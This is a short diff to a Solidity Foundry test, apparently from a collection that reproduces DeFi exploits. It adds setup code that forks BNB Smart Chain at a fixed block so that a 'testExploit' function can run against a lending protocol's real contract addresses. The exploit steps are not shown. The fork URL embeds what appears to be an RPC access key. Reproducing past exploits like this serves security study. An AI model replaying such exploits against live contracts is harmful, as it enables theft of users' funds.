@@ -14,6 +14,13 @@ contract ContractTest is DSTest {
     ICointroller cointroller = ICointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
     ISimplePriceOracle simplePriceOracle = ISimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);
     IPriceFeed chainlinkBNBUSDPriceFeed = IPriceFeed(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://divine-black-wind.bsc.discover.quiknode.pro/64ab050694137dfcbf4c20daec2e94dc515c1d60/", 16956474); //fork bsc at block 16956474
+        cheats.selectFork(mainnetFork);
+    }
 
     function testExploit() public{
         emit log_named_uint("Before exploit, USDC balance of attacker:",usdc.balanceOf(address(this)));
